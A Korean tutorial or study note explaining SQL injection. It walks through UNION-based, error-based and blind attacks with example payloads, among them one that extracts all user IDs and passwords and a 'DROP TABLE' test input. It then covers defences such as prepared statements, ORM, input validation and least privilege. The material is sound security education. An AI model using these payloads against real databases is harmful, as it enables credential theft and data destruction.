# SQL Injection 이란?

- SQL 인젝션(SQL Injection)은 공격자가 웹 애플리케이션의 데이터베이스를 조작하기 위해 악의적인 SQL 코드를 삽입하는 공격 방법
- 애플리케이션이 사용자의 입력값을 그대로 SQL 쿼리에 포함할 때 발생
    - 사용자가 입력하는 로그인 또는 검색 기 등의 입력 폼에 SQL의 문법적 의미를 갖는 홑따옴표(') 입력 시 SQL 에러 메시지를 반환한다면 SQL Injection 공격이 가능한 것으로 판단
- 데이터베이스의 무단 접근, 데이터 유출, 데이터 변조 등의 심각한 문제를 야기

# SQL Injection 공격 유형

## 1. Union SQL Injection

- 원래 쿼리는 id 값 한 명의 사용자 정보만 반환하지만 공격자가 추가한 UNION 구문이 실행되면서 member 테이블의 모든 사용자 ID와 비밀번호가 함께 조회됨

### 공격 과정

- 공격자는 UNION SELECT를 사용하기 위해서 원래 쿼리의 컬럼 개수와 같은  개수의 컬럼을 맞춰야 하기 때문에 먼져 ORDER BY를 이용해서 컬럼 개수를 알아냄

```sql
SELECT * FROM member ORDER BY 1;  -- 정상 실행됨
SELECT * FROM member ORDER BY 2;  -- 정상 실행됨
SELECT * FROM member ORDER BY 3;  -- 정상 실행됨
SELECT * FROM member ORDER BY 4;  -- 오류 발생! (컬럼이 3개라는 뜻)
```

- 그 다음으로 컬럼의 데이터 타입도 맞추기 위해 null값을 넣어 본다.

```sql
SELECT * FROM member WHERE id = 'qwer' 
UNION SELECT 'test', NULL, NULL;  -- 첫 번째 컬럼이 문자열이면 정상 실행
```

```sql
SELECT * FROM member WHERE id = 'qwer' 
UNION SELECT 123, NULL, NULL;  -- 첫 번째 컬럼이 숫자면 정상 실행됨
```

- 이후 `information_schema.tables` 를 사용해 어떤 테이블이 있는 지 확인한다.

```sql
SELECT * FROM member WHERE id = 'qwer' 
UNION SELECT NULL, table_name, NULL FROM information_schema.tables;
```

- 알아낸 테이블 목록을 통해 원하는 테이블에서의 컬럼 목록을 찾는다.

```sql
SELECT * FROM member WHERE id = 'qwer' 
UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name = 'member';
```

- 최종적으로 데이터를 추출한다. 아래 쿼리를 통해 모든 사용자의 id와 비밀번호를 알 수 있다.

```sql
qwer' UNION SELECT null, id, pw FROM member; --
```

```sql
SELECT * FROM member WHERE id = 'qwer'
UNION SELECT null, id, pw FROM member;
```

## 2. Error Based SQL Injection

- 데이터베이스의 문법에 맞지 않는 쿼리문 입력 시 반환되는 에러가 정보 획득이 가능한 에러 메시지를 반환할 때 해당 에러 메시지를 분석해서 데이터를 추출하는 방식
- 단순 에러 : 단순히 문법이 잘못되었다는 에러 정보
- 정보 획득이 가능한 에러 : 무엇이 잘못되었는지에 대한 에러 정보
- 정보 획득이 가능한 에러를 유발하는 함수를 통해 에러를 발생시키고 데이터를 추출한다.

![image](https://github.com/user-attachments/assets/9687b106-fcdf-46b2-8fb2-ae97f9be9f66)


### EX) `CTXSYS.DRITHSX.SN` 함수를 활용한 공격

```sql
SELECT * FROM member WHERE id = 'qwer'
AND 1=(SELECT CTXSYS.DRITHSX.SN(password) FROM member WHERE rownum = 1);
```

- `CTXSYS.DRITHSX.SN()` 함수는 **존재하지 않는 값**을 입력하면 **해당 값이 포함된 에러 메시지를 반환**
- 따라서 `password` 컬럼에 저장된 값이 그대로 에러 메시지에 출력될 수 있음

```sql
ORA-00932: inconsistent datatypes: expected - got '1234'
```

## 3. Blind SQL Injection

- 에러 메시지가 표시되지 않더라도 참과 거짓 결과를 비교하여 데이터를 유출하는 공격 기법
- 웹 페이지의 응답 차이를 분석해서 조금씩 정보를 빼내는 방식

### 공격 과정

- 참과 거짓 결과 차이 확인
- 조건문의 결과에 따라 응답이 다르다면 공격 가능하다는 뜻

```sql
SELECT * FROM member WHERE id = 'qwer' AND 1=1;  -- (항상 참), 정상적으로 데이터 반환됨
SELECT * FROM member WHERE id = 'qwer' AND 1=2;  -- (항상 거짓), 데이터 반환되지 않음
```

- 참/거짓 조건을 이용해서 실제 데이터를 유출, 한 번에 데이터를 얻을 수 없기 때문에, **SUBSTRING() 함수를 이용해 문자 하나씩 확인**
- 아래는 데이터 베이스 이름을 알아내는 과정

```sql
SELECT * FROM member WHERE id = 'qwer' AND SUBSTRING((SELECT database()), 1, 1) = 'm';
SELECT * FROM member WHERE id = 'qwer' AND SUBSTRING((SELECT database()), 2, 1) = 'y';
SELECT * FROM member WHERE id = 'qwer' AND SUBSTRING((SELECT database()), 3, 1) = 'd';
SELECT * FROM member WHERE id = 'qwer' AND SUBSTRING((SELECT database()), 4, 1) = 'b';
```

- 위와 같이 데이터 베이스 이름 → 테이블 개수 → 테이블 이름 → 테이블 컬럼 개수 → 컬럼 이름 → 비밀번호 순서로 데이터를 추출하여 비밀번호를 추출

# SQL Injection 방어 방법

## 1. Prepared Statement

- 사용자의 입력값에 직접 SQL에 포함하지 않고 별도로 처리하는 방식

```sql
import java.sql.*;

public class SecureLogin {
    public static void main(String[] args) {
        String url = "jdbc:mysql://localhost:3306/mydb";
        String user = "dbuser";
        String password = "dbpassword";

        try (Connection conn = DriverManager.getConnection(url, user, password)) {
            String query = "SELECT * FROM users WHERE username = ? AND password = ?";
            PreparedStatement pstmt = conn.prepareStatement(query);
            pstmt.setString(1, "admin");  // 사용자의 입력값 (예시)
            pstmt.setString(2, "password123");

            ResultSet rs = pstmt.executeQuery();

            if (rs.next()) {
                System.out.println("로그인 성공!");
            } else {
                System.out.println("로그인 실패!");
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }
}

```

## 2. ORM 사용

- JPA 같은 ORM 사용시 SQL을 직접 작성하지 않아도 되기 때문에 보안이 강화됨
- 내부적으로 PreparedStatement 방식이 적용되어 SQL Injection 방어

```sql
import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.stereotype.Repository;

@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    User findByUsernameAndPassword(String username, String password);
}
```

## 3. 입력값 검증

- 사용자 입력이 예상된 형식인지 검증해서 막는 방법(보통 정규식 사용)

```sql
public class InputValidation {
    public static boolean isValidUsername(String username) {
        return username.matches("^[a-zA-Z0-9_]{3,16}$");  // 영문, 숫자, 언더스코어만 허용
    }

    public static void main(String[] args) {
        String input = "admin'; DROP TABLE users; --";
        if (!isValidUsername(input)) {
            System.out.println("잘못된 입력값입니다.");
        } else {
            System.out.println("정상적인 입력입니다.");
        }
    }
}

```

## 4. 최소 권한 원칙 적용

- 데이터 베이스 사용 계정이 데이터 조회만 가능하도록 권한을 설정하여 웹 애플리케이션 계정이 데이터를 삭제하거나 수정하지 못하도록 차단

```sql
-- ✅ 읽기 전용 계정 생성
CREATE USER 'readonly_user'@'localhost' IDENTIFIED BY 'securepassword';

-- ✅ 읽기 권한만 부여 (SELECT만 가능)
GRANT SELECT ON mydb.* TO 'readonly_user'@'localhost';

-- ❌ DELETE, UPDATE, INSERT 권한 제거 (보안 강화)
REVOKE INSERT, UPDATE, DELETE ON mydb.* FROM 'readonly_user'@'localhost';
```

## 5. 에러 메시지 숨기기

- 에러 메시지를 숨겨 에러 메시지로부터 데이터를 추출하는 것을 차단

```sql
@RestControllerAdvice
public class GlobalExceptionHandler {
    @ExceptionHandler(SQLException.class)
    public ResponseEntity<String> handleSQLException(SQLException e) {
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
                .body("Invalid request");
    }
}
```

# 각 공격 유형별 대처법

## 1. UNION SQL Injection 대처법

- Prepared Statement 사용 → SQL을 직접 조작할 수 없게 막음
- 입력값 검증 → 홑따옴표(')와 같은 문자를 입력할수 없게 하여 SQL 문법을 조작할 수 없게 함

## 2. Error-Based SQL Injection 대처법

- 오류 메시지 감추기 → DB의 상세한 오류 메시지를 감추고, 일반적인 오류 메시지만 출력
- 웹 애플리케이션의 예외 처리 강화 → 서버에서 에러가 발생해도 사용자에게 노출되지 않도록 예외 처리 필요

## 3. Blind SQL Injection

- Prepared Statement 사용
- 요청 횟수 제한 → 같은 요청이 반복적으로 들어오면 차단(한 문자씩 추출해야됨으로 같은 요청이 여러번 오기 때문에)

# 참고

SQL Injection 개요 : https://www.skshieldus.com/download/files/download.do?o_fname=EQST%20insight_Special%20Report_202204.pdf&r_fname=20220419082157414.pdf

SQL Injection 보안 대책 : https://www.skshieldus.com/download/files/download.do?o_fname=EQST%20insight_Special%20Report_202209.pdf&r_fname=20220926092447242.pdf
